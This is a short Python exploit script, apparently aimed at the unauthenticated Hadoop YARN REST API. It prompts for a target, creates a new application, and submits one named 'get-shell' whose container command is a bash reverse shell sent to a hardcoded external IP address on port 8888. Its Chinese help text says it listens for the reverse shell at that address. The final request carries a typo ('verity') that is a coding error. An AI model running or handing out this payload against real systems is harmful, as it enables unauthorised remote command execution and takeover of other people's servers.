# !/usr/bin/env python

print("""help: 
监听反弹shell
默认地址 139.196.235.62:8888
自带http
""")

from requests import post

target = input('target: ')
lhost = '139.196.235.62'

url = target + 'ws/v1/cluster/apps/new-application'
resp = post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/8888 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
post(url, json=data,verity=False)
